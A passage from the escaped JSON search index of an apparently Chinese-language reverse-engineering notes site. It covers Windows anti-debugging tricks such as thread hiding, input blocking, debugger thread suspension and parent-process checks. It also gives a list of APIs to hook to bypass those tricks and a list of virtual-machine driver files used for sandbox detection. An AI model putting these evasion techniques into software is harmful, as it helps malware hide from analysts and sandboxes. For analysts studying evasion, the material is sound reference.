\u7531\u4e8e\u4e00\u6b21\u53ea\u80fd\u5c06\u4e00\u4e2a\u8c03\u8bd5\u5668Attach\u5230\u8fdb\u7a0b\uff0c\u56e0\u6b64\u9644\u52a0\u5230\u8fdb\u7a0b\u5931\u8d25\u53ef\u80fd\u8868\u660e\u5b58\u5728\u53e6\u4e00\u4e2a\u8c03\u8bd5\u5668\u3002","title":"\u81ea\u6211\u8c03\u8bd5"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#generateconsolectrlevent","text":"\u5f53\u7528\u6237\u6309\u4e0b Ctrl+C \u6216 Ctrl+Break \u5e76\u4e14\u63a7\u5236\u53f0\u7a97\u53e3\u5904\u4e8e\u7126\u70b9\u65f6\uff0cWindows \u5c06\u68c0\u67e5\u662f\u5426\u6709\u6b64\u4e8b\u4ef6\u7684\u5904\u7406\u7a0b\u5e8f\u3002 \u6240\u6709\u63a7\u5236\u53f0\u8fdb\u7a0b\u90fd\u6709\u4e00\u4e2a\u9ed8\u8ba4\u5904\u7406\u7a0b\u5e8f\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u8c03\u7528 kernel32!ExitProcess() \u51fd\u6570\u3002 \u4f46\u662f\uff0c\u6211\u4eec\u53ef\u4ee5\u4e3a\u8fd9\u4e9b\u4e8b\u4ef6\u6ce8\u518c\u4e00\u4e2a\u81ea\u5b9a\u4e49\u5904\u7406\u7a0b\u5e8f\uff0c\u8be5\u5904\u7406\u7a0b\u5e8f\u4f1a\u5ffd\u7565 Ctrl+C \u6216 Ctrl+Break \u4fe1\u53f7\u3002 \u4f46\u662f\uff0c\u5982\u679c\u6b63\u5728\u8c03\u8bd5\u63a7\u5236\u53f0\u8fdb\u7a0b\u5e76\u4e14\u672a\u7981\u7528 CTRL+C \u4fe1\u53f7\uff0c\u7cfb\u7edf\u4f1a\u751f\u6210 DBG_CONTROL_C \u5f02\u5e38\u3002 \u901a\u5e38\u8fd9\u4e2a\u5f02\u5e38\u4f1a\u88ab\u8c03\u8bd5\u5668\u62e6\u622a\uff0c\u4f46\u662f\u5982\u679c\u6211\u4eec\u6ce8\u518c\u4e00\u4e2a\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff0c\u6211\u4eec\u5c06\u80fd\u591f\u68c0\u67e5\u662f\u5426\u5f15\u53d1\u4e86 DBG_CONTROL_C \u3002 \u5982\u679c\u6211\u4eec\u5728\u81ea\u5df1\u7684\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u4e2d\u62e6\u622a\u5230 DBG_CONTROL_C \u5f02\u5e38\uff0c\u5219\u53ef\u80fd\u8868\u660e\u8be5\u8fdb\u7a0b\u6b63\u5728\u88ab\u8c03\u8bd5\u3002","title":"GenerateConsoleCtrlEvent"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#blockinput","text":"\u51fd\u6570 user32!BlockInput() \u53ef\u4ee5\u963b\u6b62\u6240\u6709\u9f20\u6807\u548c\u952e\u76d8\u4e8b\u4ef6\uff0c\u8fd9\u662f\u7981\u7528\u8c03\u8bd5\u5668\u7684\u975e\u5e38\u6709\u6548\u7684\u65b9\u6cd5\u3002 \u5728 Windows Vista \u53ca\u66f4\u9ad8\u7248\u672c\u4e0a\uff0c\u6b64\u8c03\u7528\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\u3002 \u6211\u4eec\u8fd8\u53ef\u4ee5\u68c0\u6d4b\u662f\u5426\u5b58\u5728\u6302\u94a9 user32!BlockInput() \u548c\u5176\u4ed6\u53cd\u8c03\u8bd5\u8c03\u7528\u7684\u5de5\u5177\u3002 \u8be5\u529f\u80fd\u5141\u8bb8\u8f93\u5165\u4ec5\u88ab\u963b\u6b62\u4e00\u6b21\u3002 \u7b2c\u4e8c\u6b21\u8c03\u7528\u5c06\u8fd4\u56de FALSE\u3002 \u5982\u679c\u65e0\u8bba\u8f93\u5165\u5982\u4f55\u8be5\u51fd\u6570\u90fd\u8fd4\u56de TRUE\uff0c\u5219\u53ef\u80fd\u8868\u660e\u5b58\u5728\u67d0\u79cd\u6302\u94a9\u89e3\u51b3\u65b9\u6848\u3002","title":"BlockInput"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#ntsetinformationthread","text":"\u51fd\u6570 ntdll!NtSetInformationThread() \u53ef\u7528\u4e8e\u5bf9\u8c03\u8bd5\u5668\u9690\u85cf\u7ebf\u7a0b\u3002 \u501f\u52a9\u672a\u8bb0\u5f55\u7684\u503c THREAD_INFORMATION_CLASS::ThreadHideFromDebugger (0x11) \u662f\u53ef\u80fd\u7684\u3002 \u8fd9\u662f\u4f9b\u5916\u90e8\u8fdb\u7a0b\u4f7f\u7528\u7684\uff0c\u4f46\u4efb\u4f55\u7ebf\u7a0b\u90fd\u53ef\u4ee5\u5728\u81ea\u8eab\u4e0a\u4f7f\u7528\u5b83\u3002 \u7ebf\u7a0b\u5bf9\u8c03\u8bd5\u5668\u9690\u85cf\u540e\uff0c\u5b83\u5c06\u7ee7\u7eed\u8fd0\u884c\uff0c\u4f46\u8c03\u8bd5\u5668\u4e0d\u4f1a\u63a5\u6536\u4e0e\u8be5\u7ebf\u7a0b\u76f8\u5173\u7684\u4e8b\u4ef6\u3002 \u8be5\u7ebf\u7a0b\u53ef\u4ee5\u6267\u884c\u53cd\u8c03\u8bd5\u68c0\u67e5\uff0c\u4f8b\u5982\u4ee3\u7801\u6821\u9a8c\u548c\u3001\u8c03\u8bd5\u6807\u5fd7\u9a8c\u8bc1\u7b49\u3002 \u4f46\u662f\uff0c\u5982\u679c\u9690\u85cf\u7ebf\u7a0b\u4e2d\u6709\u65ad\u70b9\u6216\u8005\u6211\u4eec\u5bf9\u8c03\u8bd5\u5668\u9690\u85cf\u4e3b\u7ebf\u7a0b\uff0c\u5219\u8fdb\u7a0b\u5c06\u5d29\u6e83\u5e76\u4e14\u8c03\u8bd5\u5668\u5c06\u88ab\u5361\u4f4f\u3002 \u5728\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u5bf9\u8c03\u8bd5\u5668\u9690\u85cf\u5f53\u524d\u7ebf\u7a0b\u3002 \u8fd9\u610f\u5473\u7740\uff0c\u5982\u679c\u6211\u4eec\u5728\u8c03\u8bd5\u5668\u4e2d\u8ddf\u8e2a\u8fd9\u6bb5\u4ee3\u7801\uff0c\u6216\u8005\u5728\u8be5\u7ebf\u7a0b\u7684\u4efb\u4f55\u6307\u4ee4\u4e0a\u8bbe\u7f6e\u65ad\u70b9\uff0c\u4e00\u65e6\u8c03\u7528 ntdll!NtSetInformationThread() \uff0c\u8c03\u8bd5\u5c31\u4f1a\u88ab\u5361\u4f4f\u3002","title":"NtSetInformationThread"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#enumwindows-and-suspendthread","text":"\u8be5\u6280\u672f\u7684\u601d\u60f3\u662f\u6302\u8d77\u7236\u8fdb\u7a0b\u7684\u6240\u5c5e\u7ebf\u7a0b\u3002 \u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u9a8c\u8bc1\u7236\u8fdb\u7a0b\u662f\u5426\u662f\u8c03\u8bd5\u5668\u3002 \u8fd9\u53ef\u4ee5\u901a\u8fc7\u679a\u4e3e\u5c4f\u5e55\u4e0a\u7684\u6240\u6709\u9876\u7ea7\u7a97\u53e3\uff08\u4f7f\u7528 user32!EnumWindows() \u6216 user32!EnumThreadWindows() \uff0c\u641c\u7d22\u8fdb\u7a0b ID \u4e3a\u7236\u8fdb\u7a0b ID \u7684\u7a97\u53e3\uff08\u4f7f\u7528 user32!GetWindowThreadProcessId() \u6765\u5b9e\u73b0\uff09 \uff09\uff0c\u5e76\u68c0\u67e5\u8be5\u7a97\u53e3\u7684\u6807\u9898\uff08\u901a\u8fc7 user32!GetWindowTextW()\uff09\u3002 \u5982\u679c\u7236\u8fdb\u7a0b\u7684\u7a97\u53e3\u6807\u9898\u770b\u8d77\u6765\u50cf\u8c03\u8bd5\u5668\u6807\u9898\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 kernel32!SuspendThread() \u6216 ntdll!NtSuspendThread() \u6302\u8d77\u6240\u5c5e\u7ebf\u7a0b\u3002","title":"EnumWindows and SuspendThread"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#switchdesktop","text":"Windows \u652f\u6301\u6bcf\u4e2a\u4f1a\u8bdd\u591a\u4e2a\u684c\u9762\u3002 \u53ef\u4ee5\u9009\u62e9\u4e0d\u540c\u7684\u6d3b\u52a8\u684c\u9762\uff0c\u8fd9\u5177\u6709\u9690\u85cf\u5148\u524d\u6d3b\u52a8\u684c\u9762\u7684\u7a97\u53e3\u7684\u6548\u679c\uff0c\u5e76\u4e14\u6ca1\u6709\u660e\u663e\u7684\u65b9\u6cd5\u53ef\u4ee5\u5207\u6362\u56de\u65e7\u684c\u9762\u3002 \u6b64\u5916\uff0c\u6765\u81ea\u88ab\u8c03\u8bd5\u8fdb\u7a0b\u684c\u9762\u7684\u9f20\u6807\u548c\u952e\u76d8\u4e8b\u4ef6\u5c06\u4e0d\u518d\u4f20\u9012\u5230\u8c03\u8bd5\u5668\uff0c\u56e0\u4e3a\u5b83\u4eec\u7684\u6e90\u4e0d\u518d\u5171\u4eab\u3002 \u8fd9\u663e\u7136\u4f7f\u5f97\u8c03\u8bd5\u53d8\u5f97\u4e0d\u53ef\u80fd\u3002","title":"SwitchDesktop"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#outputdebugstring","text":"\u6b64\u6280\u672f\u5df2\u88ab\u5f03\u7528\uff0c\u56e0\u4e3a\u5b83\u4ec5\u9002\u7528\u4e8e Vista \u4e4b\u524d\u7684 Windows \u7248\u672c\u3002 \u7136\u800c\uff0c\u8fd9\u9879\u6280\u672f\u4f17\u6240\u5468\u77e5\uff0c\u56e0\u6b64\u5728\u6b64\u4e0d\u4e88\u63d0\u53ca\u3002 \u8fd9\u4e2a\u60f3\u6cd5\u5f88\u7b80\u5355\u3002 \u5982\u679c\u8c03\u8bd5\u5668\u4e0d\u5b58\u5728\u5e76\u4e14\u8c03\u7528\u4e86 kernel32!OutputDebugString \uff0c\u5219\u4f1a\u53d1\u751f\u9519\u8bef\u3002","title":"OutputDebugString"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_29","text":"\u5728\u8c03\u8bd5\u8fc7\u7a0b\u4e2d\uff0c\u6700\u597d\u8df3\u8fc7\u53ef\u7591\u7684\u51fd\u6570\u8c03\u7528\uff08\u4f8b\u5982\u7528 NOP \u586b\u5145\u5b83\u4eec\uff09\u3002 \u5982\u679c\u4f60\u5199\u4e00\u4e2a\u53cd\u53cd\u8c03\u8bd5\u65b9\u6848\uff0c\u4ee5\u4e0b\u6240\u6709\u51fd\u6570\u90fd\u53ef\u4ee5\u88abhook\uff1a kernel32!DebugActiveProcess ntdll!DbgUiDebugActiveProcess ntdll!NtDebugActiveProcess kernel32!GenerateConsoleCtrlEvent() user32!NtUserBlockInput ntdll!NtSetInformationThread user32!NtUserBuildHwndList\uff08\u7528\u4e8e\u8fc7\u6ee4 EnumWindows \u8f93\u51fa\uff09 kernel32!SuspendThread user32!SwitchDesktop kernel32!OutputDebugStringW \u6302\u94a9\u51fd\u6570\u53ef\u4ee5\u68c0\u67e5\u8f93\u5165\u53c2\u6570\u5e76\u4fee\u6539\u539f\u59cb\u51fd\u6570\u7684\u884c\u4e3a\u3002","title":"\u7ed3\u8bba"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_30","text":"","title":"\u6742\u9879"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#findwindow","text":"\u8be5\u6280\u672f\u5305\u62ec\u7cfb\u7edf\u4e2d\u7a97\u53e3\u7c7b\u7684\u7b80\u5355\u679a\u4e3e\uff0c\u5e76\u5c06\u5b83\u4eec\u4e0e\u8c03\u8bd5\u5668\u7684\u5df2\u77e5\u7a97\u53e3\u7c7b\u8fdb\u884c\u6bd4\u8f83\u3002 \u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u51fd\u6570\uff1a user32!FindWindowW() user32!FindWindowA() user32!FindWindowExW() user32!FindWindowExA()","title":"FindWindow"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_31","text":"\u901a\u5e38\uff0c\u7528\u6237\u6a21\u5f0f\u8fdb\u7a0b\u662f\u901a\u8fc7\u53cc\u51fb\u6587\u4ef6\u56fe\u6807\u6765\u6267\u884c\u7684\u3002 \u5982\u679c\u8fdb\u7a0b\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u6267\u884c\uff0c\u5176\u7236\u8fdb\u7a0b\u5c06\u662fshell\u8fdb\u7a0b\uff08\u201cexplorer.exe\u201d\uff09\u3002 \u4ee5\u4e0b\u4e24\u79cd\u65b9\u6cd5\u7684\u4e3b\u8981\u601d\u60f3\u662f\u5c06\u7236\u8fdb\u7a0b\u7684PID\u4e0e\u201cexplorer.exe\u201d\u7684PID\u8fdb\u884c\u6bd4\u8f83\u3002","title":"\u7236\u8fdb\u7a0b\u68c0\u67e5"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#ntqueryinformationprocess_1","text":"\u8be5\u65b9\u6cd5\u5305\u62ec\u4f7f\u7528 user32!GetShellWindow() \u83b7\u53d6 shell \u8fdb\u7a0b\u7a97\u53e3\u53e5\u67c4\uff0c\u5e76\u901a\u8fc7\u8c03\u7528 user32!GetWindowThreadProcessId() \u83b7\u53d6\u5176\u8fdb\u7a0b ID\u3002 \u7136\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528 ProcessBasicInformation \u7c7b\u8c03\u7528 ntdll!NtQueryInformationProcess() \u4ece PROCESS_BASIC_INFORMATION \u7ed3\u6784\u4e2d\u83b7\u53d6\u7236\u8fdb\u7a0b ID\u3002","title":"NtQueryInformationProcess"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#createtoolhelp32snapshot","text":"\u53ef\u4ee5\u4f7f\u7528 kernel32!CreateToolhelp32Snapshot() \u548c kernel32!Process32Next() \u51fd\u6570\u83b7\u53d6\u7236\u8fdb\u7a0b ID \u548c\u7236\u8fdb\u7a0b\u540d\u79f0\u3002","title":"CreateToolhelp32Snapshot"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_32","text":"\u9009\u62e9\u5668\u503c\u53ef\u80fd\u770b\u8d77\u6765\u5f88\u7a33\u5b9a\uff0c\u4f46\u5b9e\u9645\u4e0a\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u5b83\u4eec\u662f\u4e0d\u7a33\u5b9a\u7684\uff0c\u5e76\u4e14\u8fd8\u53d6\u51b3\u4e8e Windows \u7684\u7248\u672c\u3002 \u4f8b\u5982\uff0c\u53ef\u4ee5\u5728\u7ebf\u7a0b\u5185\u8bbe\u7f6e\u9009\u62e9\u5668\u503c\uff0c\u4f46\u5b83\u53ef\u80fd\u4e0d\u4f1a\u957f\u65f6\u95f4\u4fdd\u7559\u8be5\u503c\u3002 \u67d0\u4e9b\u4e8b\u4ef6\u53ef\u80fd\u4f1a\u5bfc\u81f4\u9009\u62e9\u5668\u503c\u66f4\u6539\u56de\u5176\u9ed8\u8ba4\u503c\u3002 \u5176\u4e2d\u4e00\u4e2a\u4e8b\u4ef6\u662f\u4e00\u4e2a\u4f8b\u5916\u3002 \u5728\u8c03\u8bd5\u5668\u7684\u4e0a\u4e0b\u6587\u4e2d\uff0c\u5355\u6b65\u5f02\u5e38\u4ecd\u7136\u662f\u4e00\u4e2a\u5f02\u5e38\uff0c\u5b83\u53ef\u80fd\u4f1a\u5bfc\u81f4\u4e00\u4e9b\u610f\u5916\u7684\u884c\u4e3a\u3002","title":"\u9009\u62e9\u5668"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#dbgprint","text":"ntdll!DbgPrint() \u548c kernel32!OutputDebugStringW() \u7b49\u8c03\u8bd5\u51fd\u6570\u4f1a\u5bfc\u81f4\u5f02\u5e38 DBG_PRINTEXCEPTION_C (0x40010006) \u3002 \u5982\u679c\u7a0b\u5e8f\u662f\u4f7f\u7528\u9644\u52a0\u7684\u8c03\u8bd5\u5668\u6267\u884c\u7684\uff0c\u5219\u8c03\u8bd5\u5668\u5c06\u5904\u7406\u6b64\u5f02\u5e38\u3002 \u4f46\u662f\uff0c\u5982\u679c\u6ca1\u6709\u8c03\u8bd5\u5668\uff0c\u5e76\u4e14\u6ce8\u518c\u4e86\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\uff0c\u5219\u8be5\u5f02\u5e38\u5c06\u88ab\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u6355\u83b7\u3002","title":"DbgPrint"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#dbgsetdebugfilterstate","text":"\u51fd\u6570 ntdll!DbgSetDebugFilterState() \u548c ntdll!NtSetDebugFilterState() \u4ec5\u8bbe\u7f6e\u4e00\u4e2a\u6807\u5fd7\uff0c\u5982\u679c\u5b58\u5728\uff0c\u5c06\u68c0\u67e5\u8be5\u6807\u5fd7\u662f\u5426\u4e3a\u5185\u6838\u6a21\u5f0f\u8c03\u8bd5\u5668\u3002 \u56e0\u6b64\uff0c\u5982\u679c\u7cfb\u7edf\u9644\u52a0\u4e86\u5185\u6838\u8c03\u8bd5\u5668\uff0c\u8fd9\u4e9b\u529f\u80fd\u5c31\u4f1a\u6210\u529f\u3002 \u7136\u800c\uff0c\u7531\u4e8e\u67d0\u4e9b\u7528\u6237\u6a21\u5f0f\u8c03\u8bd5\u5668\u5f15\u8d77\u7684\u526f\u4f5c\u7528\uff0c\u8fd9\u4e9b\u51fd\u6570\u4e5f\u53ef\u80fd\u6210\u529f\u3002 \u8fd9\u4e9b\u529f\u80fd\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\u3002","title":"DbgSetDebugFilterState"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#ntyieldexecution-switchtothread","text":"\u8fd9\u79cd\u65b9\u6cd5\u5e76\u4e0d\u771f\u6b63\u53ef\u9760\uff0c\u56e0\u4e3a\u5b83\u53ea\u663e\u793a\u5f53\u524d\u8fdb\u7a0b\u4e2d\u662f\u5426\u5b58\u5728\u9ad8\u4f18\u5148\u7ea7\u7ebf\u7a0b\u3002 \u7136\u800c\uff0c\u5b83\u53ef\u4ee5\u7528\u4f5c\u53cd\u8ddf\u8e2a\u6280\u672f\u3002 \u5f53\u5728\u8c03\u8bd5\u5668\u4e2d\u8ddf\u8e2a\u5e94\u7528\u7a0b\u5e8f\u5e76\u6267\u884c\u5355\u6b65\u65f6\uff0c\u4e0a\u4e0b\u6587\u65e0\u6cd5\u5207\u6362\u5230\u5176\u4ed6\u7ebf\u7a0b\u3002 \u8fd9\u610f\u5473\u7740 ntdll!NtYieldExecution() \u8fd4\u56de STATUS_NO_YIELD_PERFORMED (0x40000024) \uff0c\u8fd9\u4f1a\u5bfc\u81f4 kernel32!SwitchToThread() \u8fd4\u56de\u96f6\u3002 \u4f7f\u7528\u6b64\u6280\u672f\u7684\u7b56\u7565\u662f\uff0c\u5982\u679c kernel32!SwitchToThread() \u8fd4\u56de\u96f6\uff0c\u6216\u8005 ntdll!NtYieldExecution() \u8fd4\u56de STATUS_NO_YIELD_PERFORMED \uff0c\u5219\u6709\u4e00\u4e2a\u5faa\u73af\u4fee\u6539\u67d0\u4e9b\u8ba1\u6570\u5668\u3002 \u8fd9\u53ef\u4ee5\u662f\u89e3\u5bc6\u5b57\u7b26\u4e32\u7684\u5faa\u73af\uff0c\u4e5f\u53ef\u4ee5\u662f\u5e94\u8be5\u5728\u8c03\u8bd5\u5668\u4e2d\u624b\u52a8\u5206\u6790\u7684\u5176\u4ed6\u5faa\u73af\u3002 \u5982\u679c\u8ba1\u6570\u5668\u5728\u79bb\u5f00\u5faa\u73af\u540e\u5177\u6709\u9884\u671f\u503c\uff08\u5373\u6240\u6709 kernel32!SwitchToThread() \u8fd4\u56de\u96f6\u65f6\u7684\u9884\u671f\u503c\uff09\uff0c\u6211\u4eec\u8ba4\u4e3a\u8c03\u8bd5\u5668\u5b58\u5728\u3002 \u5728\u4e0b\u9762\u7684\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u5b9a\u4e49\u4e86\u4e00\u4e2a\u5355\u5b57\u8282\u8ba1\u6570\u5668\uff08\u4ee5 0 \u521d\u59cb\u5316\uff09\uff0c\u5982\u679c kernel32!SwitchToThread \u8fd4\u56de\u96f6\uff0c\u5219\u8be5\u8ba1\u6570\u5668\u5411\u5de6\u79fb\u52a8\u4e00\u4f4d\u3002 \u5982\u679c\u79fb\u4f4d 8 \u6b21\uff0c\u5219\u8ba1\u6570\u5668\u7684\u503c\u5c06\u53d8\u4e3a 0\uff0c\u5e76\u4e14\u8ba4\u4e3a\u8c03\u8bd5\u5668\u5b58\u5728\u3002","title":"NtYieldExecution/ SwitchToThread"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#virtualalloc-getwritewatch","text":"\u8fd9\u9879\u6280\u672f\u88ab\u63cf\u8ff0\u4e3a\u5bf9\u8457\u540d\u7684 al-khaser \u89e3\u51b3\u65b9\u6848\u7684\u5efa\u8bae\uff0c\u8be5\u89e3\u51b3\u65b9\u6848\u662f\u4e00\u79cd\u9488\u5bf9\u8bb8\u591a\u7c7b\u4f3c\u6076\u610f\u8f6f\u4ef6\u7684\u9632\u5fa1\u6d4b\u8bd5\u865a\u62df\u673a\u3001\u8c03\u8bd5\u5668\u3001\u6c99\u7bb1\u3001\u53cd\u75c5\u6bd2\u8f6f\u4ef6\u7b49\u7684\u5de5\u5177\u3002 \u8fd9\u4e2a\u60f3\u6cd5\u6765\u81ea GetWriteWatch \u51fd\u6570\u7684\u6587\u6863\uff0c\u5176\u4e2d\u201c\u5907\u6ce8\u201d\u90e8\u5206\u8bf4\u660e\u4e86\u4ee5\u4e0b\u5185\u5bb9\uff1a \u201c\u5f53\u4f60\u8c03\u7528VirtualAlloc\u51fd\u6570\u6765\u4fdd\u7559\u6216\u63d0\u4ea4\u5185\u5b58\u65f6\uff0c\u4f60\u53ef\u4ee5\u6307\u5b9a MEM_WRITE_WATCH \u3002 \u8be5\u503c\u4f7f\u7cfb\u7edf\u8ddf\u8e2a\u5199\u5165\u5df2\u63d0\u4ea4\u5185\u5b58\u533a\u57df\u7684\u9875\u9762\u3002 \u60a8\u53ef\u4ee5\u8c03\u7528 GetWriteWatch \u51fd\u6570\u6765\u68c0\u7d22\u81ea\u533a\u57df\u5206\u914d\u6216\u5199\u5165\u8ddf\u8e2a\u72b6\u6001\u91cd\u7f6e\u4ee5\u6765\u5df2\u5199\u5165\u7684\u9875\u9762\u7684\u5730\u5740\u3002 \u6b64\u529f\u80fd\u53ef\u7528\u4e8e\u8ddf\u8e2a\u53ef\u80fd\u4fee\u6539\u9884\u671f\u6a21\u5f0f\u4e4b\u5916\u7684\u5185\u5b58\u9875\u7684\u8c03\u8bd5\u5668\u3002","title":"VirtualAlloc/ GetWriteWatch"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_33","text":"\u624b\u52a8\u8ddf\u8e2a\uff0cnop\u6389\u5173\u952e\u6307\u4ee4","title":"\u7ed3\u8bba"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_34","text":"https://evasions.checkpoint.com/","title":"\u53cd\u865a\u62df\u673a"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_35","text":"","title":"\u6587\u4ef6\u7cfb\u7edf"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E5%8F%8D%E8%B0%83%E8%AF%95%E4%B8%8E%E5%8F%8D%E8%99%9A%E6%8B%9F%E6%9C%BA/#_36","text":"GetFileAttributes \u6b64\u65b9\u6cd5\u5229\u7528\u5e38\u89c1\u4e3b\u673a\u7cfb\u7edf\u548c\u865a\u62df\u73af\u5883\u4e2d\u5b58\u5728\u7684\u6587\u4ef6\u7684\u5dee\u5f02\u3002 \u865a\u62df\u73af\u5883\u4e2d\u5b58\u5728\u5f88\u591a\u7279\u5b9a\u4e8e\u6b64\u7c7b\u7cfb\u7edf\u7684\u6587\u4ef6\u5de5\u4ef6\u3002 \u8fd9\u4e9b\u6587\u4ef6\u4e0d\u5b58\u5728\u4e8e\u672a\u5b89\u88c5\u865a\u62df\u73af\u5883\u7684\u666e\u901a\u4e3b\u673a\u7cfb\u7edf\u4e0a\u3002 \u901a\u7528\u865a\u62df\u673a c:\\[60 random hex symbols] \u7528\u4e8e\u7f16\u7801\u7684 PC \u7279\u6709\u7684\u6587\u4ef6 c:\\take_screenshot.ps1 c:\\loaddll.exe c:\\email.doc c:\\email.htm c:\\123\\email.doc c:\\123\\email.docx c:\\a\\foobar.bmp c:\\a\\foobar.doc c:\\a\\foobar.gif c:\\symbols\\aagmmc.pdb Parallels c:\\windows\\system32\\drivers\\prleth.sys \u7f51\u7edc\u9002\u914d\u5668 c:\\windows\\system32\\drivers\\prlfs.sys c:\\windows\\system32\\drivers\\prlmouse.sys \u9f20\u6807\u540c\u6b65\u5de5\u5177 c:\\windows\\system32\\drivers\\prlvideo.sys c:\\windows\\system32\\drivers\\prltime.sys \u65f6\u95f4\u540c\u6b65\u9a71\u52a8 c:\\windows\\system32\\drivers\\prl_pv32.sys \u534a\u865a\u62df\u5316\u9a71\u52a8\u7a0b\u5e8f c:\\windows\\system32\\drivers\\prl_paravirt_32.sys \u534a\u865a\u62df\u5316\u9a71\u52a8\u7a0b\u5e8f VirtualBox c:\\windows\\system32\\drivers\\VBoxMouse.sys c:\\windows\\system32\\drivers\\VBoxGuest.sys c:\\windows\\system32\\drivers\\VBoxSF.sys c:\\windows\\system32\\drivers\\VBoxVideo.sys c:\\windows\\system32\\vboxdisp.dll c:\\windows\\system32\\vboxhook.dll c:\\windows\\system32\\vboxmrxnp.dll c:\\windows\\system32\\vboxogl.dll c:\\windows\\system32\\vboxoglarrayspu.dll c:\\windows\\system32\\vboxoglcrutil.dll c:\\windows\\system32\\vboxoglerrorspu.dll c:\\windows\\system32\\vboxoglfeedbackspu.dll c:\\windows\\system32\\vboxoglpackspu.dll c:\\windows\\system32\\vboxoglpassthroughspu.dll c:\\windows\\system32\\vboxservice.exe c:\\windows\\system32\\vboxtray.exe c:\\windows\\system32\\VBoxControl.exe VirtualPC c:\\windows\\system32\\drivers\\vmsrvc.sys c:\\windows\\system32\\drivers\\vpc-s3.sys VMware c:\\windows\\system32\\drivers\\vmmouse.sys PS/2 \u8bbe\u5907\u9a71\u52a8 c:\\windows\\system32\\drivers\\vmnet.sys c:\\windows\\system32\\drivers\\vmxnet.sys PCI\u7f51\u7edc\u9002\u914d\u5668 c:\\windows\\system32\\drivers\\vmhgfs.sys HGFS \u6587\u4ef6\u7cfb\u7edf\u9a71\u52a8 c:\\windows\\system32\\drivers\\vmx86.sys 